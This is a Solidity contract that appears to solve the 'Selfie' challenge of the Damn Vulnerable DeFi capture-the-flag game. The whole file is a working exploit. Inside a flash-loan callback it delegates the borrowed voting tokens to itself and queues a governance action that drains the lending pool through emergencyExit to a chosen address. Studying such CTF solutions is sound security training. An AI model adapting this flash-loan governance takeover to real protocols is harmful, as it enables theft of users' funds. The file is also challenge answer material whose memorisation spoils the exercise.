// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract SelfieAttacker {
  SimpleGovernance governance;
  SelfiePool pool;
  address recovery;

  constructor(SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
    governance = _governance;
    pool = _pool;
    recovery = _recovery;
  }

  function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
      DamnValuableVotes(token).approve(msg.sender, amount);
      DamnValuableVotes(token).delegate(address(this));

      governance.queueAction(address(pool), 0, abi.encodeWithSelector(pool.emergencyExit.selector, recovery));

      return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }

}